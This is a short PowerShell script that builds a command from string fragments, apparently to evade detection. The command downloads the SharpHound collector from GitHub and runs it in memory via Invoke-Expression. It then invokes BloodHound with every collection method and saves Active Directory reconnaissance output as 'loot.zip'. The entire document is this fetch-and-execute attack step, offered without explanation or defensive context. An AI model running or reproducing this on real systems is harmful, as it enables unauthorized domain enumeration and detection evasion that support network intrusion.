$pre = '[ScriptBlock]::Create('
$mid = '"IEX ([System.Net.WebClient]::new()).DownloadString(''https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1''); Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip"'
$post = ')'
$joined = $pre + $mid + $post
$sb = Invoke-Expression $joined
& $sb
